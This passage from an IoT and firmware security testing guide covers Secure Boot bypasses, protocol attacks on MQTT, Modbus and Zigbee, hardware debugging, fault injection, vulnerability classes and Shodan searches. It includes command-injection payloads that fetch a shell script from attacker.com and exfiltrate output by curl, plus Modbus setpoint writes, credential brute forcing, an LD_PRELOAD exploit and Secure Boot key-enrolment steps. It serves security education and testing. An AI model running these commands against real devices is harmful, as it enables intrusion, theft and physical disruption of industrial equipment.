# EFI_SMM_CPU_PROTOCOL_GUID: {eb346b97-...} — CPU register access from SMM
# UEFI_VARIABLE_GUID: {8be4df61-...} — NVRAM variable storage
```

**Protocol Tracking:**
```
efiXplorer creates protocol usage graph:
- Which drivers install which protocols
- Which drivers consume which protocols
- Protocol interface pointer propagation
- Useful for finding trust boundaries
```

**SMM Callout Detection:**
```
efiXplorer flags:
- Calls from SMM handlers to pointers in >4GB address space
- Protocol pointers stored in non-SMRAM (potential TOCTOU)
- CommBuffer validation issues
- Calls to EFI_BOOT_SERVICES from SMM (only RT Services allowed)
```

### 4.4 Secure Boot Chain

**UEFI Secure Boot Verification Chain:**
```
PK (Platform Key)     — OEM or enterprise root key
  └─ KEK (Key Exchange Key) — Microsoft/OEM key
       └─ db (Signature Database) — Allowed signers
            └─ shim (signed by Microsoft) — First bootloader
                  └─ GRUB2 (signed by shim/distro key) — Second stage
                        └─ Linux kernel (signed by distro key)
                              └─ Kernel modules (signed by kernel)
```

**MOK (Machine Owner Key):**
```bash
# User-enrolled keys for custom kernel/module signing
mokutil --list-enrolled     # Show enrolled MOKs
mokutil --import mok.der    # Enroll new MOK (requires reboot)
mokutil --disable-validation  # Disable Secure Boot via MOK (requires reboot + password)

# Generate and enroll MOK for custom kernel modules
openssl req -new -x509 -newkey rsa:2048 -keyout MOK.key -out MOK.crt     -days 36500 -subj "/CN=My Module Signing Key/" -nodes
openssl x509 -in MOK.crt -out MOK.der -outform DER
mokutil --import MOK.der
```

### 4.5 Secure Boot Bypass Techniques

**BlackLotus (CVE-2023-24932):**
```
- First in-the-wild UEFI bootkit bypassing Secure Boot on Windows 11
- Exploits Windows Boot Manager vulnerability
- Self-signed by attacker key enrolled via UEFI variable tampering
- Capabilities: Secure Boot disable, HVCI disable, custom kernel driver loading
- Persistence: Modifies EFI System Partition (ESP) boot files
- Detection: Check ESP for unexpected EFI files, monitor UEFI variable changes
- Patch: KB5025885 (May 2023) — revokes vulnerable Windows Boot Manager versions
```

**BootHole (CVE-2020-10713):**
```
- Buffer overflow in GRUB2 grub.cfg parsing
- Any file on EFI System Partition can be modified (no Secure Boot protection)
- Allows arbitrary code execution before OS loads
- Affects all Linux distributions using Secure Boot with GRUB2
- Fix: GRUB2 update + revocation of old shim/GRUB2 signatures via dbx
- CVE chain: CVE-2020-10713 through CVE-2020-15706 (7 related vulns)
```

**UEFI Variable Tampering:**
```bash
# Direct NVRAM variable access (Linux)
ls /sys/firmware/efi/efivars/
# Read Secure Boot state
cat /sys/firmware/efi/efivars/SecureBoot-8be4df61-93ca-11d2-aa0d-00e098032b8c | xxd
# Byte 4: 1=enabled, 0=disabled

# efivar tool
efivar -l | grep -i secure
efivar -d -n 8be4df61-93ca-11d2-aa0d-00e098032b8c-SecureBoot

# SetupMode exploit (if PK not enrolled):
# Delete PK → enters Setup Mode → db/KEK writable without authentication
# Set any key in db → enroll attacker certificate → sign malicious bootloader
```

### 4.6 Intel Boot Guard

**Boot Guard Overview:**
```
Intel Boot Guard is a hardware-rooted verified boot mechanism.
OEM programs ACM (Authenticated Code Module) with SHA256 hash of IBB
(Initial Boot Block — the first firmware block) into CPU fuses (non-reversible).
If hash doesn't match, CPU halts or attempts recovery.
```

**OEM Key Fusing:**
```
Fuse values stored in CPU (PCH strap registers):
- FORCE_BOOT_GUARD_ACM: Mandate ACM execution
- FPF_BOOT_GUARD_ACM_KEY_HASH: SHA256 of OEM root key
- FPF_BOOT_GUARD_POLICY: BP.BTGP (Boot Policy Profile)

Profile 0: No Boot Guard (development/debug)
Profile 3: Verified Boot (measures IBB)
Profile 4: Measured+Verified Boot (TPM + verified)
Profile 5: Maximum protection (no debug, full measurement)
```

**PCR Values:**
```
TPM PCR measurements from Boot Guard:
PCR[0]: Core BIOS Measurement (CBM) — BIOS code
PCR[7]: SecureBoot policy (db, dbx, KEK, PK)

Inspect PCR values:
tpm2_pcrread sha256:0,1,2,3,4,5,6,7
# Changes in PCR[0] indicate firmware modification
# Use for Remote Attestation to verify platform integrity
```

### 4.7 CHIPSEC

CHIPSEC is Intel's open-source platform security assessment framework.

**Installation:**
```bash
pip install chipsec
# OR
git clone https://github.com/chipsec/chipsec
cd chipsec && python setup.py install

# Linux: load kernel module first
sudo python chipsec_util.py --no-driver  # userspace mode (limited)
sudo modprobe msr  # required for full access
sudo python chipsec_main.py  # full mode with kernel driver
```

**Key CHIPSEC Commands:**
```bash
# Run all security checks
sudo python chipsec_main.py

# Specific module categories:
# Secure Boot checks
sudo python chipsec_main.py -m common.secureboot.variables

# BIOS write protection
sudo python chipsec_main.py -m common.bios_wp
sudo python chipsec_main.py -m common.bios_wp -a bl

# SMRAM protection
sudo python chipsec_main.py -m common.smm
sudo python chipsec_main.py -m common.smrr  # SMRR registers

# Memory configuration
sudo python chipsec_main.py -m common.memconfig

# CPU SMT/Spectre mitigations
sudo python chipsec_main.py -m common.cpu.ia_untrusted

# TPM checks
sudo python chipsec_main.py -m tpm.msr

# SPI flash protection
sudo python chipsec_main.py -m common.spi_desc
sudo python chipsec_main.py -m common.spi_fdopss
sudo python chipsec_main.py -m common.spi_lock

# Specific utility commands
sudo python chipsec_util.py spi info          # SPI flash info
sudo python chipsec_util.py spi read 0 0x1000000 bios_dump.bin  # Dump SPI
sudo python chipsec_util.py mem read 0xFED40000 0x1000  # Read TPM registers
sudo python chipsec_util.py mmio dump SPIBAR  # Dump SPI BAR MMIO
sudo python chipsec_util.py uefi var-list     # List UEFI variables
sudo python chipsec_util.py uefi var-read db EFI_IMAGE_SECURITY_DATABASE_GUID  # Read db
```

---

## 5. IoT Protocol Security

### 5.1 MQTT Security

MQTT (Message Queuing Telemetry Transport) is the dominant IoT messaging protocol, running on port 1883 (plain) or 8883 (TLS).

**Common Misconfigurations:**
```bash
# Test for unauthenticated broker access
mosquitto_pub -h 192.168.1.100 -t "test/topic" -m "hello"
mosquitto_sub -h 192.168.1.100 -t "#"  # Subscribe to ALL topics (wildcard)

# Common exposed brokers (Shodan: port:1883)
# Many industrial/home automation systems expose broker without auth

# Test specific topics
mosquitto_sub -h broker.example.com -t "home/#" -v
mosquitto_sub -h broker.example.com -t "$SYS/#" -v  # Broker statistics
```

**MQTT Security Configuration:**
```conf
# /etc/mosquitto/mosquitto.conf

# Require authentication (disable anonymous)
allow_anonymous false
password_file /etc/mosquitto/passwd

# TLS configuration
listener 8883
cafile /etc/mosquitto/ca.crt
certfile /etc/mosquitto/server.crt
keyfile /etc/mosquitto/server.key
require_certificate true

# Access Control List
acl_file /etc/mosquitto/acl

# acl file format:
# user sensor1
# topic read sensors/temperature
# topic write sensors/temperature
#
# user admin
# topic #
```

**MQTT CVEs:**
| CVE | Affected | Description |
|-----|---------|-------------|
| CVE-2017-7650 | Mosquitto <1.4.15 | Pattern-based ACL bypass |
| CVE-2018-12546 | Mosquitto <1.5.1 | Unauthorized topic publish |
| CVE-2019-11779 | Mosquitto <1.6.4 | Stack overflow in SUBSCRIBE handling |
| CVE-2021-28166 | Eclipse Mosquitto | MQTT v5 excessive memory consumption DoS |
| CVE-2023-0809 | Mosquitto <2.0.16 | Denial of service via CONNACK |

**MQTT Attack Scenarios:**
```bash
# Topic enumeration (subscribe to wildcard, observe all messages)
mosquitto_sub -h target -t "#" -v -u username -P password 2>&1 | tee mqtt_dump.txt

# Inject commands via topic (common in home automation)
mosquitto_pub -h target -t "cmnd/device1/POWER" -m "ON"
mosquitto_pub -h target -t "home/alarm/set" -m "disarmed"

# MQTT over WebSocket (port 9001/9883)
# Use MQTT Explorer or mqttx GUI for WebSocket testing

# Credential brute force
hydra -l admin -P /usr/share/wordlists/rockyou.txt mqtt://target
```

### 5.2 CoAP and DTLS Security

CoAP (Constrained Application Protocol) runs over UDP port 5683, DTLS on port 5684.

**CoAP Amplification Attack:**
```bash
# CoAP supports multicast — potential for amplification DDoS
# Request: ~20 bytes, Response: can be hundreds of bytes (amplification factor 10-50x)

# Enumerate CoAP resources
coap-client -m get coap://192.168.1.1/.well-known/core

# Common CoAP resources
coap-client -m get coap://192.168.1.1/sensors/temp
coap-client -m put coap://192.168.1.1/actuator/led -e "on"

# CoAP multicast discovery (all devices on LAN)
coap-client -m get coap://224.0.1.187/.well-known/core

# Observe mode (subscribe to resource)
coap-client -m get -s 10 coap://192.168.1.1/sensors/temperature
```

**DTLS Security Issues:**
```
Common DTLS misconfigurations in IoT:
1. Pre-Shared Keys (PSK) hardcoded in firmware
2. Certificate validation disabled (accept any certificate)
3. DTLS 1.0 with deprecated cipher suites (RC4, NULL)
4. Replay protection disabled

CVE-2020-27209: DTLS session resumption vulnerability in multiple IoT stacks
CVE-2021-24082: TinyDTLS vulnerability allowing session hijacking
```

### 5.3 OPC-UA Security

OPC Unified Architecture is used in industrial IoT (IIoT) and SCADA systems.

**OPC-UA Session Hijacking CVEs:**
| CVE | Description | Impact |
|-----|-------------|--------|
| CVE-2019-13549 | Kepware OPC-UA heap overflow | Remote code execution |
| CVE-2019-13550 | Kepware OPC-UA use-after-free | Remote code execution |
| CVE-2021-27432 | OPC Foundation OPC-UA .NET | Denial of service |
| CVE-2022-25164 | Mitsubishi OPC-UA server | Auth bypass |
| CVE-2023-25155 | Multiple OPC-UA implementations | Heap corruption |

**OPC-UA Security Assessment:**
```python
from opcua import Client

# Connect to OPC-UA server (unauthenticated)
client = Client("opc.tcp://192.168.1.100:4840/")
client.connect()

# Browse node tree
root = client.get_root_node()
objects = client.get_objects_node()
print(objects.get_children())

# Read all variables
for node in objects.get_children():
    try:
        print(f"{node}: {node.get_value()}")
    except:
        pass

# Test with Anonymous authentication (often misconfigured)
client.set_security_string("Basic256Sha256,SignAndEncrypt,cert.der,key.pem")
```

### 5.4 Modbus TCP Security

Modbus TCP runs on port 502. No authentication, no encryption — designed for isolated networks.

**Modbus Attack Scenarios with pymodbus:**
```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient('192.168.1.100', port=502)
client.connect()

# Read coils (digital outputs — control physical equipment)
result = client.read_coils(0, 100, unit=1)
print(f"Coils: {result.bits}")

# Read holding registers (analog values, setpoints)
result = client.read_holding_registers(0, 50, unit=1)
print(f"Registers: {result.registers}")

# WRITE coils — can physically actuate equipment
client.write_coil(0, True, unit=1)   # Turn on coil 0
client.write_coil(5, False, unit=1)  # Turn off coil 5

# Write holding register — change setpoints
client.write_register(10, 9999, unit=1)  # Dangerous: change process setpoint

# Scan all unit IDs (1-247)
for unit_id in range(1, 248):
    result = client.read_holding_registers(0, 1, unit=unit_id)
    if not result.isError():
        print(f"Found Modbus device at unit {unit_id}")

client.close()
```

**Modbus Scanning:**
```bash
# Nmap Modbus detection
nmap -p 502 --script modbus-discover 192.168.1.0/24
nmap -p 502 --script modbus-enum --script-args "modbus-enum.unit=1" 192.168.1.100

# mbtget (Modbus CLI tool)
mbtget -r 1 -a 0 -n 10 192.168.1.100  # Read 10 holding registers
mbtget -w 1 -a 0 -v 1234 192.168.1.100  # Write value to register 0
```

### 5.5 Zigbee Security with KillerBee

KillerBee is the primary Zigbee security testing framework.

**Hardware Required:**
- RZUSBSTICK (Atmel), ApiMote, MicaZ, TelosB
- Or: TI CC2531 USB dongle with KillerBee firmware

**KillerBee Usage:**
```bash
# Install KillerBee
pip install killerbee

# Discover interfaces
zbid

# Scan for Zigbee networks
zbstumbler -i /dev/ttyUSB0

# Packet capture on channel 11
zbdump -i /dev/ttyUSB0 -c 11 -w capture.pcap

# Replay attack
zbreplay -i /dev/ttyUSB0 -r capture.pcap

# Inject packets
zbinject -i /dev/ttyUSB0 -c 11 -f packet.pcap

# Decrypt captured traffic (if key known)
zbdecrypt -r capture.pcap -k 00112233445566778899aabbccddeeff -w decrypted.pcap

# Trust Center key extraction attempt
zbkey -i /dev/ttyUSB0 -c 11
```

**Zigbee Security Weaknesses:**
```
- Default/well-known network keys (e.g., 01030507090B0D0F0... "ZigBee Alliance" key)
- Key transport in clear during join (if TC Link Key is default)
- Replay attacks (sequence number wrapping)
- Rogue coordinator (highest PANID wins, lower address rejected)
- Z-Wave S0 key negotiation intercept
```

### 5.6 AMQP/RabbitMQ Vulnerabilities

AMQP (Advanced Message Queuing Protocol) on port 5672 (plain), 5671 (TLS), 15672 (RabbitMQ Management).

**RabbitMQ Security Issues:**
```bash
# Default credentials: guest/guest (allowed from localhost only by default)
# But many deployments expose management UI or AMQP externally

# Test default credentials
curl -u guest:guest http://192.168.1.100:15672/api/overview

# List queues
curl -u admin:password http://192.168.1.100:15672/api/queues

# List exchanges
curl -u admin:password http://192.168.1.100:15672/api/exchanges

# Shodan query: port:15672 RabbitMQ

# CVE-2023-46118: RabbitMQ HTTP API DoS via large payload
# CVE-2021-32718: XSS in RabbitMQ management UI
# CVE-2020-36282: RabbitMQ Java client information disclosure
```

---

## 6. Hardware Interface Testing

### 6.1 UART Pin Identification

**Step-by-Step UART Discovery:**

```
Equipment: Multimeter, USB-to-Serial adapter (FTDI FT232RL, CP2102, CH340)

Step 1: Visual inspection
- Look for unpopulated 4-pin headers (1.27mm or 2.54mm pitch)
- Common locations: near CPU, along PCB edge, near power connector
- Headers often labeled: GND, VCC, TX, RX, or J1-J4

Step 2: Identify ground (GND)
- Set multimeter to continuity mode
- One probe on known ground (PCB screw mount, USB ground pin)
- Probe suspected UART pins — continuity = GND

Step 3: Identify VCC
- Set multimeter to DC voltage
- Power on device
- Probe remaining pins to GND
- VCC pin shows 3.3V or 5V (stable)

Step 4: Identify TX (device transmit)
- TX idles HIGH (3.3V or 5V)
- During boot: voltage fluctuates (pulses low) as data transmitted
- Use oscilloscope or logic analyzer to see serial data pattern

Step 5: Identify RX (device receive)
- RX is remaining pin after GND, VCC, TX identified
- Often pulls to VCC level (3.3V)

Step 6: Measure baud rate
- Logic analyzer: measure shortest pulse width
- 8.68 µs = 115200, 17.36 µs = 57600, 104.17 µs = 9600

Step 7: Connect
- Device TX → USB-serial RX
- Device RX → USB-serial TX
- Device GND → USB-serial GND
- DO NOT connect VCC unless powering device from USB-serial
```

**Logic Analyzer Capture (Sigrok/PulseView):**
```bash
# sigrok-cli for UART decode
sigrok-cli -d fx2lafw --channels D0 --config samplerate=1MHz     --samples 1000000 -P uart:baudrate=115200:rx=D0 -A uart=rx-data

# PulseView: GUI alternative
# Protocol: UART, configure baud rate, data bits, parity, stop bits
```

### 6.2 JTAG Boundary Scan and TAP Identification

**JTAG Pin Identification:**
```
JTAG signals: TDI, TDO, TCK, TMS, [TRST], [RTCK]
SWD signals: SWDIO, SWCLK, [SWO], [RESET]

Identification methods:
1. PCB silk screen labels (TDI, TDO, TCK, TMS, JTAG)
2. Via schematic (if available)
3. JTAG Pin Finder tools (jtagulator, JTAGenum)
4. Manual probing with logic analyzer
```

**JTAGulator:**
```
Open-source hardware for automated JTAG discovery:
1. Connect all suspected JTAG pins to JTAGulator channels
2. Connect GND
3. Serial console at 115200 baud
4. Command: B (bypass scan) — finds TCK, TMS, TDI, TDO
5. Reports detected JTAG pin assignments and device count

jtagulator> b          # BYPASS scan (finds TCK/TMS/TDI/TDO)
jtagulator> i          # IDCODE scan
jtagulator> d 0x0b     # Target specific device (ARM Cortex-A)
```

**JTAGenum (Arduino-based):**
```cpp
// Flash JTAGenum.ino to Arduino
// Wire suspected JTAG pins to Arduino digital pins
// Serial monitor at 115200
// Send 's' to scan for JTAG
// Automated TAP detection
```

**IDCODE Extraction:**
```bash
# OpenOCD
openocd -f interface/ftdi/openocd-usb.cfg -c "transport select jtag"     -c "adapter speed 1000"     -c "jtag init; scan_chain; exit"

# Output:
# TapName             Enabled IdCode     Expected   IrLen IrCap IrMask
# ----------------------------------------------------------------
# auto0.tap              Y 0x4ba00477 0xffffffff     4 0x01  0x0f
# 0x4ba00477 = ARM Cortex-A9 (manufacturer: ARM, part: Cortex-A9)
```

**JTAG IDCODE Decoding:**
```
IDCODE format (32 bits):
Bits[31:28] = Version (4 bits)
Bits[27:12] = Part Number (16 bits)
Bits[11:1]  = Manufacturer ID (11 bits, JEDEC JEP106)
Bit[0]      = 1 (fixed)

ARM manufacturer: 0x23B (Arm Ltd)
Common ARM IDCODEs:
0x4ba00477 = Cortex-A9 DAP
0x2ba01477 = Cortex-A5
0x5ba02477 = Cortex-A15 DAP
0x0bb11477 = Cortex-M0
0x2ba01477 = Cortex-M3
0x4bb11477 = Cortex-M4
```

### 6.3 SPI/I2C Sniffing with Sigrok/PulseView

**SPI Sniffing:**
```bash
# Hardware: Logic analyzer (Saleae Logic Pro, fx2lafw cheap clone)
# Connect: CS, CLK, MOSI, MISO channels to respective SPI lines

# sigrok-cli SPI decode
sigrok-cli -d fx2lafw --channels CS=D3,CLK=D0,MISO=D1,MOSI=D2     --config samplerate=4MHz     --samples 10000000     -P spi:cs=CS:clk=CLK:miso=MISO:mosi=MOSI:cpol=0:cpha=0:bitorder=msb     -A spi=miso-transfer,mosi-transfer

# Capture during firmware update for decryption key extraction
# Many devices send encryption keys over SPI to TPM or SE

# SPI flash sniff during boot (captures firmware reads)
# Connect SOIC clip in parallel (high-impedance read)
sigrok-cli -d fx2lafw --channels CS=D3,CLK=D0,MISO=D1     --config samplerate=8MHz --samples 50000000     -P spi -A spi=miso-transfer > spi_flash_boot.txt
```

**I2C Sniffing:**
```bash
# I2C: SDA, SCL (2 wires)
sigrok-cli -d fx2lafw --channels SDA=D0,SCL=D1     --config samplerate=1MHz --samples 1000000     -P i2c:sda=SDA:scl=SCL     -A i2c=data-read,data-write,address-read,address-write

# Common I2C targets on IoT boards:
# 0x50-0x57: EEPROM (AT24Cxx) — often stores config/credentials
# 0x68: RTC (DS1307, DS3231)
# 0x3C: OLED display
# 0x40: Power management IC
# 0x48-0x4F: ADC chips
```

### 6.4 Voltage Glitching with ChipWhisperer

**ChipWhisperer Overview:**
ChipWhisperer is an open-source hardware security research platform for power analysis and fault injection.

**Hardware:**
- ChipWhisperer-Lite (CW1173): ~$250, built-in target
- ChipWhisperer-Pro (CW1200): ~$1500, professional features
- CW-Husky: Latest version with USB 3.0

**Voltage Glitch Basics:**
```python
import chipwhisperer as cw

# Setup scope and target
scope = cw.scope()
target = cw.target(scope)

scope.default_setup()

# Configure glitch module
scope.glitch.clk_src = 'clkgen'    # Use internal clock
scope.glitch.output = 'glitch_only'  # Pure glitch output
scope.glitch.trigger_src = 'ext_single'  # Trigger on external signal

# Glitch parameters to sweep:
scope.glitch.width = 10       # Glitch width (clock cycles)
scope.glitch.offset = 5       # Offset from trigger point
scope.glitch.repeat = 1       # Number of glitches

# Attempt glitch
scope.arm()
target.simpleserial_write('p', bytearray([0]*16))
ret = scope.capture()
response = target.simpleserial_read('r', 16)
print(f"Response: {response.hex()}")
```

### 6.5 Fault Injection Attack Surfaces

**Secure Boot Bypass via Glitching:**
```
Target: Bootloader hash verification function
Method:
1. Identify target function via UART boot messages or JTAG
2. Trigger glitch at moment of signature verification
3. Corrupt comparison result or skip return instruction
4. Device proceeds to boot unsigned firmware

Success criteria: Boot continues with modified firmware

CVE examples:
- NXP i.MX HAB bypass via voltage glitch (multiple researchers)
- Samsung Secure Boot bypass on Exynos (Project Zero 2021)
- STM32 RDP Level 2 bypass (Jon Oberheide, 2018)
```

**JTAG Re-Enable via Glitch:**
```
Many devices disable JTAG by checking a fuse/register at boot.
Glitch the check instruction to re-enable JTAG access.
Target: ROM code reading JTAG disable bit from OTP fuses

Typical success rate: 0.1-5% per attempt
May require thousands of attempts with automated setup
```

### 6.6 Side-Channel Power Analysis

**Simple Power Analysis (SPA):**
```python
# Capture power trace during cryptographic operation
import chipwhisperer as cw
import numpy as np

scope = cw.scope()
scope.adc.samples = 3000
scope.adc.offset = 0

traces = []
for i in range(100):
    scope.arm()
    target.simpleserial_write('k', key_bytes)
    scope.capture()
    traces.append(scope.get_last_trace())

# Visual inspection: distinct operations visible in power trace
# AES SubBytes, ShiftRows, MixColumns show characteristic patterns
```

**Differential Power Analysis (DPA):**
```python
import numpy as np
from scipy.stats import pearsonr

# Correlation Power Analysis (CPA) — most effective
# 1. Collect N traces with known plaintexts
# 2. For each key hypothesis k (0-255):
#    Predict intermediate value: SubBytes(plaintext[0] XOR k)
#    Compute Hamming weight of predicted value
#    Correlate with actual power traces
# 3. Correct key shows highest correlation

plaintexts = []  # N plaintexts used
traces = []       # N power traces

def hamming_weight(n):
    return bin(n).count('1')

SBOX = [0x63, 0x7c, 0x77, ...]  # AES S-Box

correlations = []
for k in range(256):
    hypotheses = [hamming_weight(SBOX[p[0] ^ k]) for p in plaintexts]
    corrs = [pearsonr(hypotheses, [t[sample] for t in traces])[0]
             for sample in range(len(traces[0]))]
    correlations.append(max(abs(c) for c in corrs))

correct_key_byte = np.argmax(correlations)
```

---

## 7. Common IoT Vulnerability Classes

### 7.1 Default and Hardcoded Credentials

**Default Credential Databases:**
- **arnaudsoullie/ics-default-passwords**: 2000+ ICS/SCADA/IoT device default credentials
  - URL: https://github.com/arnaudsoullie/ics-default-passwords
  - Covers: Siemens, Allen-Bradley, Schneider, Honeywell, GE, ABB
- **DefaultCreds-cheat-sheet**: 1500+ network device defaults
- **routersploit**: Built-in credential database for routers

**Testing Default Credentials:**
```bash
# routersploit automated scanner
msfconsole -q
use auxiliary/scanner/multi/login
set RHOSTS 192.168.1.0/24
set USERPASS_FILE /path/to/defaults.txt
run

# Manual common IoT defaults:
# admin:admin, admin:password, admin:(blank)
# root:root, root:admin, root:12345
# user:user, admin:1234, admin:Admin
# support:support, ubnt:ubnt (Ubiquiti)
# pi:raspberry (Raspberry Pi)
# ftp:ftp (anonymous FTP)
```

**Hardcoded Credential Extraction:**
```bash
# strings extraction
strings firmware.bin | grep -iE "password|passwd|secret|admin|user|root|login"

# binwalk extraction then filesystem search
binwalk -e firmware.bin
cd _firmware.bin.extracted/squashfs-root/

# Search config files
grep -rn "password\|passwd\|secret" etc/ 2>/dev/null | grep -v "#"

# Search binary files for credential patterns
find . -type f | xargs strings 2>/dev/null | grep -E "^[a-z0-9]{4,20}:[a-z0-9!@#$]{4,20}$"

# Look for /etc/passwd and /etc/shadow
cat etc/passwd
cat etc/shadow
john --wordlist=/usr/share/wordlists/rockyou.txt etc/shadow

# Search for SSH private keys
find . -name "id_rsa" -o -name "*.pem" -o -name "*.key" 2>/dev/null

# JWT secrets in web apps
grep -rn "jwt_secret\|JWT_SECRET\|secret_key" . 2>/dev/null
```

### 7.2 Command Injection via Web Interface

**Common Injection Points:**
```
- Ping/traceroute/diagnostic tools that pass user input to shell
- NTP server configuration
- DNS server configuration
- DDNS hostname fields
- Network name (SSID)
- Username/password fields for network services
- SNMP community string
- Log file download functions
```

**Command Injection Examples:**
```bash
# Ping diagnostic injection (classic)
# Normal: POST /cgi-bin/ping.cgi  target=192.168.1.1
# Injected: target=192.168.1.1;id
# Injected: target=192.168.1.1|cat /etc/passwd
# Injected: target=$(wget http://attacker.com/shell.sh -O /tmp/s && sh /tmp/s)

# Blind injection with out-of-band confirmation
# target=192.168.1.1;nslookup attacker-controlled.dns.server
# target=192.168.1.1;curl http://192.168.1.200:8080/`whoami`

# Injection in JSON API
# POST /api/diag {"target": "192.168.1.1; id #"}

# CVE-2021-35003: TP-Link TL-WR840N RCE via ping diagnostic
# CVE-2019-16920: D-Link DSL-2750B command injection
# CVE-2020-25506: D-Link DNS-320 RCE via command injection
# CVE-2021-44228 (Log4Shell): Affects IoT devices running Java-based mgmt
```

### 7.3 Buffer Overflows in Embedded Web Servers

**Common Embedded HTTP Servers:**

**uhttpd (OpenWrt):**
```
CVE-2021-22220: uhttpd CSRF token bypass
Primary attack vector: Long URI, malformed chunked encoding
Binary location: /usr/sbin/uhttpd
```

**mini_httpd:**
```bash
# CVE-2018-18778: mini_httpd path traversal → arbitrary file read
curl http://192.168.1.1/../../../etc/passwd --path-as-is

# CVE-2019-11395: mini_httpd < 1.28 buffer overflow in HTTP request parsing
python3 -c "print('GET /' + 'A'*8192 + ' HTTP/1.0

')" | nc 192.168.1.1 80
```

**thttpd:**
```bash
# thttpd tilde expansion buffer overflow
# Affects many embedded routers using thttpd 2.25b
curl "http://192.168.1.1/~$(python3 -c 'print("A"*256)')"

# thttpd CGI handling vulnerabilities
# CVE-2000-0359: Old thttpd DoS
# Many proprietary modifications introduce new vulnerabilities
```

**GoAhead WebServer:**
```
CVE-2017-17562: GoAhead 2.5.0-3.6.5 RCE via CGI environment variables
Affects: many IP cameras, routers, NAS
Payload: Send HTTP request with LD_PRELOAD=malicious.so as query string
curl "http://192.168.1.1/cgi-bin/info?LD_PRELOAD=/tmp/mal.so"
```

### 7.4 CVE Table: Common IoT Devices

| Device | CVE | Type | CVSS | Description |
|--------|-----|------|------|-------------|
| D-Link DIR-615 | CVE-2019-17621 | RCE | 9.8 | Command injection via UPnP |
| D-Link DCS-2530L | CVE-2019-10999 | Stack overflow | 9.8 | Buffer overflow in UPnP SSDP |
| TP-Link TL-WR840N | CVE-2021-35003 | RCE | 9.8 | Command injection in ping |
| TP-Link Archer C7 | CVE-2020-10882 | RCE | 8.8 | tdpServer command injection |
| Netgear R7000 | CVE-2016-6277 | RCE | 9.8 | Unauthenticated command injection |
| Netgear DGN2200 | CVE-2017-6334 | RCE | 8.8 | Command injection via SOAP |
| Hikvision cameras | CVE-2021-36260 | RCE | 9.8 | Command injection in ISAPI |
| Hikvision NVR | CVE-2017-7921 | Auth bypass | 10.0 | Authentication bypass |
| Dahua cameras | CVE-2021-33044 | Auth bypass | 9.8 | Authentication bypass |
| Dahua DVR | CVE-2017-6343 | RCE | 10.0 | Remote code execution |
| Ubiquiti EdgeOS | CVE-2021-22909 | RCE | 8.8 | Command injection |
| MikroTik RouterOS | CVE-2018-14847 | Cred leak | 9.1 | WinBox buffer over-read |
| QNAP NAS | CVE-2021-28799 | RCE | 9.8 | Hard-coded credentials |
| Synology DSM | CVE-2021-29086 | Info disclosure | 5.3 | Information disclosure |
| Reolink cameras | CVE-2021-40150 | Info disclosure | 7.5 | Sensitive info in logs |

### 7.5 Unsigned OTA Updates

**Attack Scenario:**
```
1. Device downloads firmware update from vendor server or CDN
2. Update lacks cryptographic signature, or signature not verified
3. Attacker performs MITM (ARP poisoning, rogue AP, DNS hijack)
4. Attacker serves modified firmware with backdoor/malware
5. Device installs malicious firmware → persistent compromise

Detection:
- Capture update traffic: monitor network during "check for updates"
- MITM with mitmproxy to inspect/replace firmware binary
- Check if device verifies TLS certificate (certificate pinning)
- Check if firmware has embedded signature verification code:
  strings firmware.bin | grep -i "verify\|signature\|rsa\|sha256"
```

**Firmware Signing (Proper Implementation):**
```bash
# Generate signing key pair
openssl genrsa -out firmware_signing.key 4096
openssl rsa -in firmware_signing.key -pubout -out firmware_signing.pub

# Sign firmware
openssl dgst -sha256 -sign firmware_signing.key -out firmware.sig firmware.bin

# Verify (as device should do)
openssl dgst -sha256 -verify firmware_signing.pub -signature firmware.sig firmware.bin

# Embed public key in bootloader ROM (immutable)
# Verification must happen before execution
```

### 7.6 Exposed Debug Interfaces

**Common Debug Interface Scenarios:**
```bash
# Telnet exposed on internal interface
telnet 192.168.1.1
# Many devices: telnet enabled by default, no password on console

# SSH debug access with known keys
# Cisco, Juniper, Aruba: vendor master keys found in leaked firmware
ssh -i vendor_debug_key admin@192.168.1.1

# Web-based debug pages (not linked from UI)
curl http://192.168.1.1/debug/
curl http://192.168.1.1/cgi-bin/debug.cgi
curl http://192.168.1.1/hidden/

# Busybox telnetd started by init script
strings _firmware.bin.extracted/squashfs-root/etc/init.d/rcS | grep telnet
strings _firmware.bin.extracted/squashfs-root/etc/inittab

# /proc/cmdline reveals console port
cat /proc/cmdline
# console=ttyS0,115200 root=/dev/mtdblock2 init=/bin/sh
```

### 7.7 Unencrypted Management Protocols

```bash
# Telnet (port 23) — plaintext
nmap -p 23 192.168.1.0/24 --open

# HTTP management (port 80) — plaintext
nmap -p 80 192.168.1.0/24 --open

# SNMP v1/v2c (port 161) — plaintext, default community "public"
snmpwalk -v2c -c public 192.168.1.1
nmap -sU -p 161 --script snmp-brute 192.168.1.0/24

# TR-069/CWMP (port 7547) — ISP remote management
nmap -p 7547 192.168.1.0/24 --open
# CVE-2014-9222 "Misfortune Cookie": TR-069 HTTP cookie overflow

# FTP (port 21) — plaintext
nmap -p 21 192.168.1.0/24 --open
ftp 192.168.1.1  # Try anonymous login

# Unencrypted MQTT (port 1883)
nmap -p 1883 192.168.1.0/24 --open
```

---

## 8. IoT Security Testing Methodology

### 8.1 Shodan IoT Fingerprinting

**Shodan Account Setup:**
```bash
# Install Shodan CLI
pip install shodan
shodan init YOUR_API_KEY

# Basic search
shodan search "Netgear"
shodan search 'port:23 "login:" "Password:"'

# Count results
shodan count 'port:1883 MQTT'
```

**Device-Specific Shodan Queries:**
```bash
# IP cameras
shodan search 'title:"Network Camera" country:US'
shodan search 'webcamxp'
shodan search 'Server: IP Camera'
shodan search '"Hikvision" port:80'
shodan search '"Dahua" port:37777'

# Routers
shodan search 'title:"Router" port:80 "admin"'
shodan search '"TP-Link" "Server: TP-LINK"'
shodan search '"DD-WRT"'

# Industrial/SCADA
shodan search 'port:502 modbus'
shodan search 'port:102 "S7"'  # Siemens S7 PLC
shodan search 'port:4840 opc'  # OPC-UA
shodan search 'port:20000 dnp3'  # DNP3

# IoT protocols
shodan search 'port:1883 MQTT'      # Unauthenticated MQTT brokers
shodan search 'port:5683 CoAP'      # CoAP devices
shodan search 'port:5900 VNC'       # VNC (no auth IoT)
shodan search 'port:2323 telnet'    # Mirai-targeted Telnet

# Specific vulnerable versions
shodan search 'GoAhead-Webs'
shodan search '"Server: mini_httpd"'
shodan search '"Basic realm=DSL Router"'

# Advanced filters
shodan search 'has_screenshot:true port:80 "camera"'
shodan search 'hostname:*.zyxel.* vuln:CVE-2021-35029'
```

